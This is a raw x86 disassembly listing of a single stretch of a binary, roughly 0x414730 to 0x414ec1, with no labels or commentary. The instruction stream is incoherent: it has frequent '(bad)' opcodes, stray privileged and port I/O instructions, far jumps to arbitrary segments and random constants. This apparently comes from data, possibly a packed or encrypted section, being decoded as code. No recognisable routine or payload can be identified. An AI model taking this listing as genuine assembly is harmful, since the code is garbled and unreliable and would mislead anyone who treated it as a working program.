  414730:	push   esi
  414731:	outs   dx,DWORD PTR ds:[esi]
  414732:	int3   
  414733:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414734:	scas   eax,DWORD PTR es:[edi]
  414735:	or     BYTE PTR [edi-0x2fc6a336],ch
  41473b:	pop    esi
  41473c:	js     0x414776
  41473e:	sbb    dh,BYTE PTR [edi-0x78]
  414741:	jp     0x4146fe
  414743:	retf   0x5033
  414746:	pop    ds
  414747:	inc    ecx
  414748:	(bad)  
  414749:	fdiv   DWORD PTR [ecx+edx*4-0x3c3ceb08]
  414750:	scas   al,BYTE PTR es:[edi]
  414751:	cmp    edi,DWORD PTR [ebx]
  414753:	popf   
  414754:	adc    eax,0xe9e7ca56
  414759:	jbe    0x414772
  41475b:	pop    edx
  41475c:	aam    0xb6
  41475e:	mov    edi,DWORD PTR [edx+0x4]
  414761:	sub    ah,BYTE PTR [esi+0x3e]
  414764:	icebp  
  414765:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414766:	add    esi,DWORD PTR [esi]
  414768:	retf   0x51ff
  41476b:	fwait
  41476c:	enter  0xd9cd,0x24
  414770:	pop    edx
  414771:	jbe    0x4147a7
  414773:	int3   
  414774:	adc    eax,edi
  414776:	shr    DWORD PTR [ebx+0x5ac45c7b],cl
  41477c:	mov    al,0x5d
  41477e:	jb     0x414711
  414780:	xor    ebx,DWORD PTR [ecx-0x44c02134]
  414786:	mov    bh,0x75
  414788:	xor    ecx,edi
  41478a:	fdiv   DWORD PTR [edx]
  41478c:	ins    BYTE PTR es:[edi],dx
  41478d:	je     0x41479e
  41478f:	xchg   edi,eax
  414790:	cmc    
  414791:	int3   
  414792:	add    ebx,DWORD PTR [ecx]
  414794:	out    0x18,al
  414796:	ins    BYTE PTR es:[edi],dx
  414797:	cmp    eax,0x93bc73d3
  41479c:	sbb    al,0x79
  41479e:	pop    ebp
  41479f:	or     eax,0x351fe90
  4147a4:	mov    edx,0x7e365008
  4147a9:	mov    bh,0x9e
  4147ab:	pop    ss
  4147ac:	and    edx,DWORD PTR [edi+0x53]
  4147af:	mov    ebx,0x7ea95e88
  4147b4:	cld    
  4147b5:	fld    DWORD PTR [eax+0x74]
  4147b8:	clc    
  4147b9:	test   BYTE PTR [edx],cl
  4147bb:	or     eax,0xdda9e431
  4147c0:	clc    
  4147c1:	ret    0x5e94
  4147c4:	and    esp,DWORD PTR [edi]
  4147c6:	ss (bad) 
  4147c8:	jg     0x414805
  4147ca:	mov    ebx,0xa45a3cda
  4147cf:	push   ecx
  4147d0:	into   
  4147d1:	arpl   WORD PTR [eax+ebp*2],ax
  4147d4:	mov    ds:0x6c597d32,eax
  4147d9:	in     al,dx
  4147da:	cdq    
  4147db:	sub    ecx,DWORD PTR [esi]
  4147dd:	mov    ebp,0x3a3ca466
  4147e2:	xchg   ecx,eax
  4147e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147e4:	call   0xd7bf112f
  4147e9:	into   
  4147ea:	call   0x1f78cb9f
  4147ef:	jp     0x414813
  4147f1:	xchg   edi,eax
  4147f2:	ret    0x249c
  4147f5:	ja     0x41477a
  4147f7:	push   esi
  4147f8:	jl     0x414780
  4147fa:	popa   
  4147fb:	jbe    0x41485d
  4147fd:	(bad)  
  4147fe:	pop    edi
  4147ff:	in     eax,0x34
  414801:	ss (bad) 
  414803:	out    dx,al
  414804:	sbb    BYTE PTR [ecx-0x1b5f0b9f],bl
  41480a:	mov    ss,WORD PTR [eax+edi*4]
  41480d:	jmp    0x414867
  41480f:	sbb    eax,0x34b64fb
  414814:	mov    ebp,0xa935bf05
  414819:	and    al,0xc4
  41481b:	push   esi
  41481c:	test   BYTE PTR [ebx],ah
  41481e:	out    0xa4,al
  414820:	fidivr DWORD PTR [ebp+0x8fea73e]
  414826:	inc    ecx
  414827:	dec    ebp
  414828:	lods   eax,DWORD PTR ds:[esi]
  414829:	mov    bh,0x1f
  41482b:	pop    ebx
  41482c:	jecxz  0x41482e
  41482e:	ja     0x4147f2
  414830:	repnz loop 0x4148ab
  414833:	and    edx,eax
  414835:	ins    DWORD PTR es:[edi],dx
  414836:	nop
  414837:	dec    eax
  414838:	lods   al,BYTE PTR ds:[esi]
  414839:	es nop
  41483b:	test   al,0x7d
  41483d:	outs   dx,BYTE PTR ds:[esi]
  41483e:	jmp    0x75e4:0x2fb1d79e
  414845:	pop    edx
  414846:	int    0xe3
  414848:	stos   BYTE PTR es:[edi],al
  414849:	push   esp
  41484a:	jb     0x41484d
  41484c:	sub    esp,esp
  41484e:	add    eax,0x11c5067e
  414853:	out    dx,eax
  414854:	js     0x41485b
  414856:	nop
  414857:	jnp    0x4147f3
  414859:	xlat   BYTE PTR ds:[ebx]
  41485a:	cdq    
  41485b:	mov    ds:0xbcf84d1e,eax
  414860:	cld    
  414861:	jnp    0x414840
  414863:	push   0xfb7836c8
  414868:	add    al,0xc3
  41486a:	push   edx
  41486b:	mov    ebp,0xfa0174ab
  414870:	stos   DWORD PTR es:[edi],eax
  414871:	and    BYTE PTR [eax],dh
  414873:	adc    al,0x3c
  414875:	rcr    dl,0xb
  414878:	popf   
  414879:	cmp    DWORD PTR [ebp-0x70cf4d7a],ebp
  41487f:	es xchg esp,eax
  414881:	outs   dx,DWORD PTR ds:[esi]
  414882:	dec    esp
  414883:	popa   
  414884:	xor    DWORD PTR [edi-0xeb4b53d],esi
  41488a:	add    DWORD PTR ds:0xf0695f8d,esp
  414890:	inc    edi
  414891:	jecxz  0x414883
  414893:	or     al,0x98
  414895:	adc    dh,BYTE PTR [ebx]
  414897:	in     al,dx
  414898:	imul   eax,DWORD PTR [ebx-0x52],0xffffffa1
  41489c:	adc    dh,al
  41489e:	(bad)  
  41489f:	fiadd  WORD PTR [eax+0x53]
  4148a2:	push   ss
  4148a3:	mov    edx,0xc29731e5
  4148a8:	imul   ebp,DWORD PTR [ebx+0x7d],0xc2b2fbdb
  4148af:	jnp    0x4148a4
  4148b1:	test   BYTE PTR [esi],cl
  4148b3:	jns    0x41488c
  4148b5:	inc    ebp
  4148b6:	jl     0x414930
  4148b8:	pop    edi
  4148b9:	lods   eax,DWORD PTR ds:[esi]
  4148ba:	sbb    eax,0x4754ceb4
  4148bf:	call   0x69884ce6
  4148c4:	fstp   TBYTE PTR [eax]
  4148c6:	clc    
  4148c7:	cmc    
  4148c8:	not    DWORD PTR [ebx]
  4148ca:	jge    0x4148c6
  4148cc:	jne    0x414911
  4148ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4148cf:	je     0x414913
  4148d1:	mov    bl,0x7f
  4148d3:	mov    ebp,0x3f8ecc2
  4148d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148d9:	test   DWORD PTR [edx+eax*1+0x4c],eax
  4148dd:	mov    bh,0xdb
  4148df:	mov    dl,0x86
  4148e1:	out    dx,eax
  4148e2:	xchg   ebx,eax
  4148e3:	in     eax,dx
  4148e4:	inc    edi
  4148e5:	or     eax,0xb865a5d8
  4148ea:	adc    al,0x93
  4148ec:	push   edx
  4148ed:	fs int3 
  4148ef:	lods   al,BYTE PTR ds:[esi]
  4148f0:	in     al,0x43
  4148f2:	pop    esi
  4148f3:	push   ds
  4148f4:	pusha  
  4148f5:	mov    ah,0x1a
  4148f7:	pop    eax
  4148f8:	mov    DWORD PTR [eax-0x2928be9d],edx
  4148fe:	test   DWORD PTR [esi+0x5cc5a4b9],ebx
  414904:	mov    ds:0xca23ad90,eax
  414909:	jge    0x4148b5
  41490b:	ret    
  41490c:	mov    ch,0x5c
  41490e:	or     eax,0x5a20485d
  414913:	jecxz  0x41495e
  414915:	xor    eax,esi
  414917:	pop    ebx
  414918:	pop    ecx
  414919:	lods   al,BYTE PTR ds:[esi]
  41491a:	sbb    DWORD PTR [ecx+ebp*2-0x78],0x45
  41491f:	hlt    
  414920:	fs es jle 0x414987
  414924:	fimul  DWORD PTR [ebp-0x47731349]
  41492a:	stos   BYTE PTR es:[edi],al
  41492b:	mov    al,ds:0x1b277a4d
  414930:	inc    esi
  414931:	das    
  414932:	pop    es
  414933:	pop    ebp
  414934:	in     al,dx
  414935:	xchg   esp,eax
  414936:	addr16 (bad) 
  41493a:	imul   eax,eax,0xffffff9d
  41493d:	push   eax
  41493e:	paddusw mm1,QWORD PTR [edx+edi*1+0x52e8d6b5]
  414946:	shl    DWORD PTR [esi-0x50],0xff
  41494a:	pop    esp
  41494b:	pop    esi
  41494c:	(bad)  
  41494d:	int3   
  41494e:	call   0x1b17d253
  414953:	arpl   ax,sp
  414955:	pandn  mm4,QWORD PTR [esi-0x4775ad59]
  41495c:	pop    esp
  41495d:	mov    al,ds:0x76377b0b
  414962:	adc    DWORD PTR [esi+0x35],ebp
  414965:	int3   
  414966:	mov    cl,0xc0
  414968:	sahf   
  414969:	jb     0x41495b
  41496b:	out    0xe3,eax
  41496d:	xchg   BYTE PTR [edi-0x4b],cl
  414970:	cmp    dl,BYTE PTR [edx+0x203025a7]
  414976:	scas   eax,DWORD PTR es:[edi]
  414977:	stos   DWORD PTR es:[edi],eax
  414978:	pop    edx
  414979:	xchg   ebx,eax
  41497a:	int    0x27
  41497c:	dec    esi
  41497d:	mov    ah,0xbb
  41497f:	ret    
  414980:	int    0xab
  414982:	leave  
  414983:	rol    BYTE PTR [esi],0x96
  414986:	inc    ebp
  414987:	mov    esp,0x9f09f89f
  41498c:	xchg   edi,eax
  41498d:	popa   
  41498e:	test   eax,0x2f20a0fd
  414993:	imul   edi,DWORD PTR [eax],0x42
  414996:	xor    BYTE PTR [ebp+0x5d5e3be5],ch
  41499c:	leave  
  41499d:	dec    esp
  41499e:	mov    esi,0x64ab5c8a
  4149a3:	and    DWORD PTR [ecx+ecx*4+0x7],edx
  4149a7:	ret    0x2691
  4149aa:	dec    DWORD PTR [ebp-0x75cede05]
  4149b0:	mov    bh,bh
  4149b2:	cmp    DWORD PTR [ecx+0x6e9fb0c1],eax
  4149b8:	jg     0x41494f
  4149ba:	stc    
  4149bb:	out    0xd3,al
  4149bd:	push   cs
  4149be:	retf   0x2248
  4149c1:	jmp    0x414a37
  4149c3:	pop    ebx
  4149c4:	pop    ecx
  4149c5:	not    DWORD PTR [edx-0xee6f5b5]
  4149cb:	jmp    0x4149ae
  4149cd:	inc    BYTE PTR [edi+0x304eb799]
  4149d3:	in     eax,dx
  4149d4:	sbb    esp,DWORD PTR [ebp+0x4232729a]
  4149da:	les    esp,FWORD PTR [edi-0x4bc2e214]
  4149e0:	sub    ebp,DWORD PTR [edx-0x53]
  4149e3:	xor    eax,0x3b7ef2c6
  4149e8:	popf   
  4149e9:	add    DWORD PTR [ecx-0x7b],ebx
  4149ec:	jno    0x414a03
  4149ee:	push   esi
  4149ef:	es fdivr DWORD PTR es:[ebp-0x44dab927]
  4149f7:	adc    eax,0x9bbb934e
  4149fc:	daa    
  4149fd:	(bad)  
  4149fe:	push   ebp
  4149ff:	lds    ebp,FWORD PTR [ecx+0x583275bd]
  414a05:	mov    esi,0xaa9b9988
  414a0a:	(bad)  
  414a0c:	(bad)  
  414a0e:	and    ebx,DWORD PTR [edx]
  414a10:	(bad)  
  414a11:	retf   0x599b
  414a14:	lods   eax,DWORD PTR ds:[esi]
  414a15:	addr16 mov cl,0xe3
  414a18:	mov    edx,0x83cee4ba
  414a1d:	inc    edi
  414a1e:	dec    edi
  414a1f:	sub    eax,0xb779a161
  414a24:	rcr    ebp,0x37
  414a27:	xchg   edx,eax
  414a28:	or     esp,DWORD PTR [edx]
  414a2a:	push   esi
  414a2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a2c:	mov    ah,0x5a
  414a2e:	or     DWORD PTR [edx+0x5b],0xd87d5a07
  414a35:	sub    DWORD PTR [ebp+0x2b728663],edx
  414a3b:	call   0x8c7:0xaa4e2dfe
  414a42:	sti    
  414a43:	jae    0x414a2e
  414a45:	sbb    al,0xa9
  414a47:	mov    eax,ds:0x6acc8c80
  414a4c:	jbe    0x414ac7
  414a4e:	nop
  414a4f:	(bad)  
  414a50:	repz sar BYTE PTR [edx+0x4b],cl
  414a54:	sub    DWORD PTR es:[ebx],0x24d4cf45
  414a5b:	test   DWORD PTR [edx+0x5668b244],ebx
  414a61:	call   0x1e19b718
  414a66:	je     0x414aae
  414a68:	jmp    FWORD PTR [ebx-0x2d]
  414a6b:	test   BYTE PTR ds:0xbc144c91,dh
  414a71:	xchg   edx,eax
  414a72:	cdq    
  414a73:	sub    bl,BYTE PTR [ebp+0x4fbc5656]
  414a79:	sub    eax,0x414b9a04
  414a7e:	cwde   
  414a7f:	push   ecx
  414a80:	aam    0x8e
  414a82:	pusha  
  414a83:	loope  0x414ab8
  414a85:	ss ss ins BYTE PTR es:[edi],dx
  414a88:	inc    esp
  414a89:	leave  
  414a8a:	and    eax,0x117e402b
  414a8f:	adc    esi,DWORD PTR [edx-0x3f639011]
  414a95:	jmp    0x414b12
  414a97:	xchg   edx,eax
  414a98:	push   edi
  414a99:	outs   dx,BYTE PTR ds:[esi]
  414a9a:	lods   eax,DWORD PTR ds:[esi]
  414a9b:	ins    DWORD PTR es:[edi],dx
  414a9c:	xor    al,0x56
  414a9e:	and    ah,cl
  414aa0:	iret   
  414aa1:	inc    edi
  414aa2:	ror    cl,1
  414aa4:	xchg   esi,eax
  414aa5:	or     ch,BYTE PTR [ebx-0x20]
  414aa8:	into   
  414aa9:	ds cwde 
  414aab:	jle    0x414b17
  414aad:	or     al,0x60
  414aaf:	jmp    0x414a5f
  414ab1:	aam    0x1c
  414ab3:	(bad)  
  414ab4:	push   edi
  414ab5:	pusha  
  414ab6:	push   ss
  414ab7:	dec    esp
  414ab8:	sar    ebp,0x40
  414abb:	sahf   
  414abc:	stos   BYTE PTR es:[edi],al
  414abd:	mul    DWORD PTR [edi-0x4ff82a59]
  414ac3:	faddp  st(7),st
  414ac5:	(bad)  
  414ac7:	dec    ecx
  414ac8:	arpl   WORD PTR [eax+0x39],sp
  414acb:	outs   dx,DWORD PTR ds:[esi]
  414acc:	int3   
  414acd:	fmul   DWORD PTR [ecx+0x5c]
  414ad0:	mov    ds:0x135de39,al
  414ad5:	cdq    
  414ad6:	stc    
  414ad7:	jp     0x414b41
  414ad9:	pop    esp
  414ada:	push   0xf2fadc26
  414adf:	jle    0x414af5
  414ae1:	mov    dh,0xf4
  414ae3:	dec    ecx
  414ae4:	ret    
  414ae5:	arpl   di,bp
  414ae7:	and    BYTE PTR [ecx-0x46c3073c],dh
  414aed:	loope  0x414ab4
  414aef:	jno    0x414acc
  414af1:	jmp    0x2d744ee9
  414af6:	ins    BYTE PTR es:[edi],dx
  414af7:	mov    ch,0x1
  414af9:	iret   
  414afa:	les    edi,FWORD PTR [esi+edi*1+0xb]
  414afe:	xor    BYTE PTR [edi+0x358acb63],dl
  414b04:	sub    esi,DWORD PTR [ecx+0x62103031]
  414b0a:	iret   
  414b0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b0c:	pop    ebp
  414b0d:	adc    BYTE PTR [esi+0x7795b8b9],bl
  414b13:	jg     0x414b3d
  414b15:	int3   
  414b16:	cmc    
  414b17:	push   ss
  414b18:	and    bh,bl
  414b1a:	lods   eax,DWORD PTR ds:[esi]
  414b1b:	xchg   ebp,eax
  414b1c:	and    ebp,DWORD PTR [edi+0x6a]
  414b1f:	jne    0x414b7d
  414b21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b22:	addr16 xchg ecx,eax
  414b24:	pushf  
  414b25:	clc    
  414b26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b27:	push   eax
  414b28:	loope  0x414b4c
  414b2a:	es or  dh,ch
  414b2d:	push   ebp
  414b2e:	inc    ecx
  414b2f:	pop    ss
  414b30:	push   eax
  414b31:	jnp    0x414ad2
  414b33:	pop    esi
  414b34:	jo     0x414b71
  414b36:	clc    
  414b37:	in     al,dx
  414b38:	pop    es
  414b39:	mov    ds:0xd48186d4,al
  414b3e:	loop   0x414b0d
  414b40:	mov    ah,0xa2
  414b42:	jle    0x414b52
  414b44:	jbe    0x414b3a
  414b46:	inc    ecx
  414b47:	jp     0x414b5e
  414b49:	xchg   ebp,eax
  414b4a:	inc    edi
  414b4b:	push   eax
  414b4c:	aaa    
  414b4d:	jae    0x414ad0
  414b4f:	dec    edx
  414b50:	loopne 0x414b08
  414b52:	es (bad) 
  414b54:	cld    
  414b55:	ins    BYTE PTR es:[edi],dx
  414b56:	xchg   ebp,eax
  414b57:	popa   
  414b58:	sub    BYTE PTR [ecx-0x1ff334c9],ah
  414b5e:	jecxz  0x414af7
  414b60:	xor    al,0x16
  414b62:	imul   esi,DWORD PTR [edx+eiz*2-0x30011842],0xa2ec2550
  414b6d:	mov    DWORD PTR [eax-0x55],edx
  414b70:	add    BYTE PTR [ebx+0x75],bh
  414b73:	jl     0x414bbf
  414b75:	std    
  414b76:	xlat   BYTE PTR ds:[ebx]
  414b77:	and    BYTE PTR [eax+0x42a1eaaf],0xec
  414b7e:	lods   eax,DWORD PTR fs:[esi]
  414b80:	xor    al,0x50
  414b82:	push   ebx
  414b83:	int    0xd3
  414b85:	dec    ecx
  414b86:	call   0x40d04962
  414b8b:	inc    ebp
  414b8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b8d:	or     bh,BYTE PTR [ecx+0x47]
  414b90:	loopne 0x414bf1
  414b92:	jnp    0x414b27
  414b94:	mov    esi,0x5fd72a6e
  414b99:	jb     0x414c0d
  414b9b:	inc    ebp
  414b9c:	mov    al,ds:0x44df4ed6
  414ba1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ba2:	sub    BYTE PTR [edx+edx*4],dl
  414ba5:	pusha  
  414ba6:	dec    ebp
  414ba7:	push   0xffffff81
  414ba9:	jns    0x414bc4
  414bab:	xchg   edi,eax
  414bac:	retf   0xa1fd
  414baf:	mov    ebx,0x1e3e9e00
  414bb4:	das    
  414bb5:	pop    ebp
  414bb6:	pusha  
  414bb7:	pop    ebp
  414bb8:	bound  ebx,QWORD PTR [edx-0x66]
  414bbb:	imul   esp,DWORD PTR [ebp-0x6e],0xfffffff9
  414bbf:	mov    DWORD PTR [ebp-0x24710717],eax
  414bc5:	fadd   st(6),st
  414bc7:	push   DWORD PTR [edx+0x7f]
  414bca:	and    BYTE PTR [ebx+esi*2],0xb0
  414bce:	es gs jne 0x414b52
  414bd2:	aad    0x63
  414bd4:	fmul   DWORD PTR [ebx]
  414bd6:	test   BYTE PTR [edi-0x368fae1c],0x12
  414bdd:	sar    dl,0xb1
  414be0:	inc    esi
  414be1:	imul   edi,esi,0x8c29aa40
  414be7:	mov    esi,0x23618781
  414bec:	jnp    0x414bd7
  414bee:	shl    edx,0x73
  414bf1:	push   es
  414bf2:	xchg   ecx,eax
  414bf3:	ret    0x9886
  414bf6:	dec    edx
  414bf7:	idiv   ebp
  414bf9:	xor    DWORD PTR [edx],0xe1872354
  414bff:	rcr    BYTE PTR [esi],0xa5
  414c02:	xor    al,0x3c
  414c04:	adc    ecx,DWORD PTR [edi-0x6d]
  414c07:	mov    ds:0xdcb8155b,al
  414c0c:	lea    eax,[edi+esi*1-0x3148b016]
  414c13:	and    BYTE PTR [esi+0x3d17a7af],dh
  414c19:	mov    ah,bl
  414c1b:	xlat   BYTE PTR ds:[ebx]
  414c1c:	repz inc esp
  414c1e:	xor    al,0x17
  414c20:	xchg   esi,eax
  414c21:	jbe    0x414c59
  414c23:	push   eax
  414c24:	sar    dl,0xfe
  414c27:	jne    0x414bf4
  414c29:	push   cs
  414c2a:	aam    0xa4
  414c2c:	add    DWORD PTR [esi-0x3e],ecx
  414c2f:	jmp    0x414bc5
  414c31:	jo     0x414cb1
  414c33:	cs xor edi,esp
  414c36:	mov    edi,0xeb8ead9d
  414c3b:	shl    BYTE PTR [eax+0x1d8bdd75],0x7c
  414c42:	mov    ah,0xee
  414c44:	clc    
  414c45:	sbb    al,0x1e
  414c47:	jg     0x414c8f
  414c49:	(bad)  
  414c4a:	sub    al,0x55
  414c4c:	sahf   
  414c4d:	out    0x39,al
  414c4f:	(bad)  [ebx]
  414c51:	aas    
  414c52:	repz xchg edi,eax
  414c54:	jp     0x414cd5
  414c56:	imul   edx,esp,0x1634ec80
  414c5c:	mov    ebp,0xef9e00a3
  414c61:	bound  edx,QWORD PTR [ebx+0x74]
  414c64:	sbb    eax,0x38b52191
  414c69:	adc    edi,DWORD PTR [ecx-0x60]
  414c6c:	sbb    eax,0xfa30de3b
  414c71:	sub    ch,BYTE PTR [eax+ecx*4]
  414c74:	mov    ebp,0x5edb9491
  414c79:	ror    al,0x70
  414c7c:	add    ah,BYTE PTR ds:0x17f3d83
  414c82:	call   0x8e2f175e
  414c87:	jl     0x414c7d
  414c89:	mov    eax,ds:0x9005723a
  414c8e:	pop    cx
  414c90:	fdivr  DWORD PTR [ecx-0x4f]
  414c93:	or     al,0x14
  414c95:	push   0x972bdc46
  414c9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c9b:	cmc    
  414c9c:	pop    edx
  414c9d:	cmc    
  414c9e:	jno    0x414c91
  414ca0:	cmp    eax,0x9c5046ca
  414ca5:	daa    
  414ca6:	push   ebp
  414ca7:	sti    
  414ca8:	clc    
  414ca9:	shr    DWORD PTR [eax-0x4659aee5],0x19
  414cb0:	in     al,dx
  414cb1:	mov    eax,ds:0x92c639e3
  414cb6:	push   esp
  414cb7:	adc    edi,edx
  414cb9:	mov    al,ds:0x2d12f012
  414cbe:	test   ecx,0xd07703a3
  414cc4:	xchg   BYTE PTR [eax+0xbc434eb],ah
  414cca:	call   0x24e4:0x203acb95
  414cd1:	icebp  
  414cd2:	mov    WORD PTR [eax],es
  414cd4:	mov    DWORD PTR [edx+eiz*8],ebp
  414cd7:	out    dx,eax
  414cd8:	aad    0xdf
  414cda:	mov    esi,0x92a0c216
  414cdf:	or     DWORD PTR [esi+0x5a],ebx
  414ce2:	pop    ebx
  414ce3:	push   esp
  414ce4:	mov    edi,0x28f1043b
  414ce9:	das    
  414cea:	popf   
  414ceb:	mov    al,0x29
  414ced:	jmp    0x414ce0
  414cef:	pop    ebx
  414cf0:	and    eax,0xcee66e7c
  414cf5:	in     eax,0x60
  414cf7:	sbb    al,0xf0
  414cf9:	mov    ebx,0x259f9589
  414cfe:	pop    ss
  414cff:	jecxz  0x414ca8
  414d01:	sub    bh,BYTE PTR [edx+0x6fe40502]
  414d07:	xor    al,0xe1
  414d09:	pop    eax
  414d0a:	imul   ebx,DWORD PTR [esi],0xf350e997
  414d10:	push   ebp
  414d11:	test   ebp,0xa7f33682
  414d17:	jns    0x414d75
  414d19:	jo     0x414cef
  414d1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d1c:	sbb    al,0xd9
  414d1e:	add    cl,BYTE PTR [edi-0x31]
  414d21:	cdq    
  414d22:	xchg   DWORD PTR [edx],ecx
  414d24:	sub    al,0x86
  414d26:	push   es
  414d27:	addr16 dec edx
  414d29:	mov    cl,0xed
  414d2b:	loopne 0x414cff
  414d2d:	in     al,0xa5
  414d2f:	cdq    
  414d30:	dec    edx
  414d31:	(bad)  
  414d32:	mov    edi,0x5781a4d8
  414d37:	call   0x570ab890
  414d3c:	add    edx,esi
  414d3e:	or     BYTE PTR [ebp-0x340a9fd6],0xa9
  414d45:	push   esp
  414d46:	cmc    
  414d47:	int3   
  414d48:	mov    esp,eax
  414d4a:	add    BYTE PTR [edx-0x78624264],bl
  414d50:	std    
  414d51:	fimul  WORD PTR [esi+0x37]
  414d54:	pop    edi
  414d55:	icebp  
  414d56:	sbb    al,0xb8
  414d58:	sti    
  414d59:	pusha  
  414d5a:	lahf   
  414d5b:	fistp  QWORD PTR [esp+eax*4+0xe5f95c5]
  414d62:	xor    al,0xdb
  414d64:	adc    eax,esp
  414d66:	pop    edi
  414d67:	xchg   BYTE PTR [ebx-0x3e4077ae],dh
  414d6d:	and    eax,0xd921f1fe
  414d72:	stos   DWORD PTR es:[edi],eax
  414d73:	xor    esp,DWORD PTR [ebp+ebx*2+0x12]
  414d77:	pop    eax
  414d78:	push   cs
  414d79:	jmp    0x414dae
  414d7b:	add    edi,DWORD PTR [ecx]
  414d7d:	int3   
  414d7e:	inc    ebp
  414d7f:	stos   DWORD PTR es:[edi],eax
  414d80:	mov    al,0x65
  414d82:	xor    BYTE PTR [eax-0x5a31596f],cl
  414d88:	sbb    eax,0x8892284d
  414d8d:	dec    eax
  414d8f:	scas   eax,DWORD PTR es:[edi]
  414d90:	push   ebp
  414d91:	xlat   BYTE PTR ds:[ebx]
  414d92:	pop    ebp
  414d93:	xchg   al,bl
  414d95:	das    
  414d96:	in     eax,0xa0
  414d98:	xchg   ebp,eax
  414d99:	mov    bh,0xcd
  414d9b:	dec    ecx
  414d9c:	in     al,dx
  414d9d:	shr    BYTE PTR [ebx],cl
  414d9f:	dec    esp
  414da0:	xor    BYTE PTR [esi+0x6dae1de2],cl
  414da6:	push   0x21
  414da8:	inc    edi
  414da9:	xor    DWORD PTR [esi+edx*1+0x1c],edx
  414dad:	jecxz  0x414d5a
  414daf:	rcr    DWORD PTR [edi-0xd],cl
  414db2:	mov    edi,0xf16a29a7
  414db7:	mov    eax,ebx
  414db9:	mov    bh,0x28
  414dbb:	sahf   
  414dbc:	jo     0x414e35
  414dbe:	push   ecx
  414dbf:	(bad)  
  414dc0:	mov    cl,0xbf
  414dc2:	add    al,0x1a
  414dc4:	add    al,cl
  414dc6:	outs   dx,DWORD PTR ds:[esi]
  414dc7:	push   ebp
  414dc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414dc9:	(bad)  
  414dcb:	cwde   
  414dcc:	popf   
  414dcd:	pop    es
  414dce:	mov    ds:0x9b474e59,eax
  414dd3:	xchg   ebp,eax
  414dd4:	ret    
  414dd5:	das    
  414dd6:	ins    BYTE PTR es:[edi],dx
  414dd7:	es jmp 0x414e57
  414dda:	mov    ch,0xac
  414ddc:	mov    BYTE PTR [edi-0x41],bh
  414ddf:	push   edi
  414de0:	dec    ebx
  414de1:	and    DWORD PTR [eax-0x293760a5],ebx
  414de7:	mov    al,0xfe
  414de9:	aaa    
  414dea:	or     dl,ch
  414dec:	repz jl 0x414dd7
  414def:	(bad)  
  414df0:	(bad)  
  414df1:	fwait
  414df2:	je     0x414e01
  414df4:	pusha  
  414df5:	neg    DWORD PTR [ebx+0x1f1e1ad7]
  414dfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414dfc:	adc    DWORD PTR [edi+eiz*1],edi
  414dff:	retf   
  414e00:	lods   al,BYTE PTR ds:[esi]
  414e01:	fwait
  414e02:	mov    al,ds:0xf94e97e3
  414e07:	icebp  
  414e08:	sbb    BYTE PTR [ebx],dh
  414e0a:	stos   DWORD PTR es:[edi],eax
  414e0b:	shl    BYTE PTR [ecx-0x34bd7504],cl
  414e11:	mov    ch,0xf5
  414e13:	push   0xbd8527dc
  414e18:	pop    ecx
  414e19:	sahf   
  414e1a:	adc    BYTE PTR [esp+edi*1+0x52],al
  414e1e:	stos   BYTE PTR es:[edi],al
  414e1f:	(bad)  
  414e20:	es shl dl,0xe
  414e24:	jmp    0x8c04:0xe3ab31d3
  414e2b:	jmp    0x410de02c
  414e30:	pop    edi
  414e31:	retf   
  414e32:	ds xchg edx,eax
  414e34:	aam    0x7
  414e36:	jp     0x414e55
  414e38:	fild   DWORD PTR [ebx+ebp*8+0x6fe45b6c]
  414e3f:	xchg   ebp,eax
  414e40:	adc    eax,0x177c6ccb
  414e45:	rcl    DWORD PTR [eax+0x2edd7356],1
  414e4b:	inc    ecx
  414e4c:	daa    
  414e4d:	fstp   TBYTE PTR [esi]
  414e4f:	iret   
  414e50:	imul   eax,DWORD PTR [edx],0xffffffba
  414e53:	ror    ebx,0xfe
  414e56:	mov    ebp,0x16d71dc6
  414e5b:	sub    dl,cl
  414e5d:	cmp    eax,0x68b897ee
  414e62:	mov    ds:0xcb46d4b9,al
  414e67:	(bad)  
  414e68:	std    
  414e69:	cdq    
  414e6a:	mov    bl,0xe8
  414e6c:	inc    edi
  414e6d:	aaa    
  414e6e:	xchg   esi,eax
  414e6f:	mov    esp,DWORD PTR [esi]
  414e71:	mul    ch
  414e73:	add    DWORD PTR [ebx],esp
  414e75:	and    dl,BYTE PTR [edi+0x68]
  414e78:	mov    bh,0x1f
  414e7a:	xor    DWORD PTR [edi],esp
  414e7c:	mov    al,ds:0xcaf550d5
  414e81:	pop    esi
  414e82:	inc    ebx
  414e83:	fnsave [eax+0x20]
  414e86:	cmp    BYTE PTR ss:[edx+0x6a],0x95
  414e8b:	add    dh,BYTE PTR [ebx-0x10]
  414e8e:	sahf   
  414e8f:	jbe    0x414eab
  414e91:	xchg   edi,eax
  414e92:	call   0x8e69:0x39afeaca
  414e99:	scas   eax,DWORD PTR es:[edi]
  414e9a:	sub    dh,0x25
  414e9d:	dec    edx
  414e9e:	cwde   
  414e9f:	mov    cs,ebp
  414ea1:	fwait
  414ea2:	mov    fs,WORD PTR [esi-0x36]
  414ea5:	or     BYTE PTR [edi+0x50],dh
  414ea8:	dec    ecx
  414ea9:	ins    DWORD PTR es:[edi],dx
  414eaa:	loop   0x414e77
  414eac:	fs pop edi
  414eaf:	aam    0xd2
  414eb1:	ret    
  414eb2:	fbstp  TBYTE PTR [ebx+0x5a]
  414eb5:	scas   al,BYTE PTR es:[edi]
  414eb6:	dec    eax
  414eb7:	xabort 0x5d
  414eba:	fild   WORD PTR [ebp-0x6e]
  414ebd:	sbb    al,0xb2
  414ebf:	sub    al,0xbb
  414ec1:	ror    DWORD PTR [edi],1
